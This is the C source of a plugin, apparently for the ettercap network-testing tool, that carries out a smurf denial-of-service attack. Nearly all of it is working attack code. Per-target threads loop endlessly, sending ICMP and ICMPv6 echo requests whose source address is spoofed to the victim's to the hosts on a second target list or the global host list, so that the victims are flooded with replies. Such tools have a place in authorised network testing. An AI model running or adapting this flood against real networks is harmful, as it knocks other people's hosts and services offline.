/*
 *    the smurf attack plugin for ettercap
 *
 *    XXX - attack against IPv4 hosts is broken by some kernel bug
 *    on some systems as the kernel amends the source ip address
 */

#include <ec.h>
#include <ec_inet.h>
#include <ec_plugins.h>
#include <ec_send.h>
#include <ec_threads.h>
#include <ec_sleep.h>

/* protos */
int plugin_load(void *);
static int smurf_attack_init(void *);
static int smurf_attack_fini(void *);
static int smurf_attack_unload(void *);
static EC_THREAD_FUNC(smurfer);

/* globals */

struct plugin_ops smurf_attack_ops = {
   .ettercap_version =     EC_VERSION,
   .name =                 "smurf_attack",
   .info =                 "Run a smurf attack against specified hosts",
   .version =              "1.0",
   .init =                 &smurf_attack_init,
   .fini =                 &smurf_attack_fini,
   .unload =               &smurf_attack_unload,
};

/* teh c0d3 */

int plugin_load(void *handle)
{
   return plugin_register(handle, &smurf_attack_ops);
}

static int smurf_attack_init(void *dummy)
{
   struct ip_list *i;

   /* variable not used */
   (void) dummy;

   DEBUG_MSG("smurf_attack_init");

   if(EC_GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("smurf_attack: plugin doesn't work in unoffensive mode\n");
      return PLUGIN_FINISHED;
   }

   if(EC_GBL_TARGET1->all_ip && EC_GBL_TARGET1->all_ip6) {
      USER_MSG("Add at least one host to target one list.\n");
      return PLUGIN_FINISHED;
   }

   if(EC_GBL_TARGET2->all_ip && EC_GBL_TARGET2->all_ip6 && LIST_EMPTY(&EC_GBL_HOSTLIST)) {
      USER_MSG("Target two and global hostlist are empty.\n");
      return PLUGIN_FINISHED;
   }

   EC_GBL_OPTIONS->quiet = 1;
   INSTANT_USER_MSG("smurf_attack: starting smurf attack against the target one hosts\n");

   /* creating a thread per target */
   LIST_FOREACH(i, &EC_GBL_TARGET1->ips, next) {
      ec_thread_new("smurfer", "thread performing a smurf attack", &smurfer, &i->ip);
   }

   /* same for IPv6 targets */
   LIST_FOREACH(i, &EC_GBL_TARGET1->ip6, next) {
      ec_thread_new("smurfer", "thread performing a smurf attack", &smurfer, &i->ip);
   }

   return PLUGIN_RUNNING;
}

static int smurf_attack_fini(void *dummy)
{
   pthread_t pid;

   /* variable not used */
   (void) dummy;

   DEBUG_MSG("smurf_attack_fini");

   while(!pthread_equal(ec_thread_getpid(NULL), pid = ec_thread_getpid("smurfer"))) {
      ec_thread_destroy(pid);
   }

   return PLUGIN_FINISHED;
}

static int smurf_attack_unload(void *dummy)
{
   /* variable not used */
   (void) dummy;

   return PLUGIN_UNLOADED;
}

static EC_THREAD_FUNC(smurfer)
{
   struct ip_addr *ip;
   struct ip_list *i, *itmp;
   struct hosts_list *h, *htmp;
   LIST_HEAD(ip_list_t, ip_list) *ips = NULL;

   u_int16 proto;
   int (*icmp_send)(struct ip_addr*, struct ip_addr*);

   DEBUG_MSG("smurfer");

   ec_thread_init();
   ip = EC_THREAD_PARAM;
   proto = ntohs(ip->addr_type);

   /* some pointer magic here. nothing difficult */
   switch(proto) {
      case AF_INET:
         icmp_send = send_L3_icmp_echo;
         ips = (struct ip_list_t *)&EC_GBL_TARGET2->ips;
         break;
#ifdef WITH_IPV6
      case AF_INET6:
         icmp_send = send_L3_icmp6_echo;
         ips = (struct ip_list_t *)&EC_GBL_TARGET2->ip6;
         break;
#endif
      default:
      /* This won't ever be reached
       * if no other network layer protocol
       * is added.
       */
         ec_thread_destroy(ec_thread_getpid(NULL));
         break;
   }

   LOOP {
      CANCELLATION_POINT();

      /* if target two list is not empty using it */
      if(!LIST_EMPTY(ips))
         LIST_FOREACH_SAFE(i, ips, next, itmp)
            icmp_send(ip, &i->ip);
      /* else using global hostlist */
      else
         LIST_FOREACH_SAFE(h, &EC_GBL_HOSTLIST, next, htmp)
            if(ntohs(h->ip.addr_type) == proto)
               icmp_send(ip, &h->ip);

      ec_usleep(1000*1000/EC_GBL_CONF->sampling_rate);
   }

   return NULL;
}

